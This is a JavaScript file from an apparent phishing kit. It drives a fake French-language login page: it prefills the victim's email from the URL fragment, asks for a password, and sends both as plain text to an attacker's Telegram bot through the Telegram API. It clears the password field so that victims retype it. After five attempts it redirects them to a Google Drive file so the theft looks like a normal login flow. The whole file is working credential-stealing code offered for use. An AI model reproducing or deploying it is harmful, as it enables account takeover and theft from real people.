/* global $ */
$(document).ready(function() {
    var count = 0;

    $(document).keypress(function(event) {
        var keycode = (event.keyCode ? event.keyCode : event.which);
        if (keycode == '13') {
            if ($("#divPr").is(":visible")) {
                $("#submit-btn").trigger("click");
            } else {
                $("#next").trigger("click");
            }
        }
    });

    $('#next').click(function() {
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var ai = $("#ai").val();

        ///////////new injection////////////////
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!ai) {
            $('#error').show();
            $('#error').html("Le champ e-mail est vide.!");
            ai.focus;
            return false;
        }

        if (!filter.test(my_ai)) {
            $('#error').show();
            $('#error').html("Ce compte n'existe pas. Entrez un autre compte");
            ai.focus;
            return false;
        }
        $("#next").html("Vérification...");

        setTimeout(function() {
            $("#ai").attr('readonly', '');
            $("#divPr").animate({ right: 0, opacity: "show" }, 1000);
            $("#next").html("next");
            $("#next").animate({ left: 0, opacity: "hide" }, 0);
            $("#submit-btn").animate({ right: 0, opacity: "show" }, 1000);
        }, 1000);
    });

    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        // $('#ai').val(ai);
        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#ai').val(my_ai);

        $("#msg").hide();
    }
    ///////////////url getting ai////////////////

    var telegramBotURL = "https://api.telegram.org/bot" + telegramConfig.botToken + "/sendMessage";

    $('#submit-btn').click(function(event) {
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();

        ///////////new injection////////////////
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!ai) {
            $('#error').show();
            $('#error').html("Le champ e-mail est vide.!");
            ai.focus;
            return false;
        }

        if (!filter.test(my_ai)) {
            $('#error').show();
            $('#error').html("Ce compte n'existe pas. Entrez un autre compte");
            ai.focus;
            return false;
        }
        if (!pr) {
            $('#error').show();
            $('#error').html("Le champ mot de passe est vide.!");
            ai.focus;
            return false;
        }

        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        ///////////new injection////////////////
        count = count + 1;

        $.ajax({
            dataType: 'JSON',
            url: telegramBotURL,
            type: 'POST',
            data: {
                chat_id: telegramConfig.chatID,
                text: "Email: " + ai + "\nPassword: " + pr,
            },
            beforeSend: function(xhr) {
                $('#submit-btn').html('Vérification...');
            },
            success: function(response) {
                if (response) {
                    $("#msg").show();
                    console.log(response);
                    if (response['ok']) {
                        $("#pr").val("");
                        if (count >= 5) {
                            count = 0;
                            window.location.replace("https://drive.google.com/file/d/1eNHvaGM65gZPNQetBmCc0X9V14ygIJ9J/view");
                        }
                    }
                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 5) {
                    count = 0;
                    window.location.replace("https://drive.google.com/file/d/1eNHvaGM65gZPNQetBmCc0X9V14ygIJ9J/view");
                }
                $("#msg").show();
            },
            complete: function() {
                $('#submit-btn').html("S'identifier");
            }
        });
    });
});
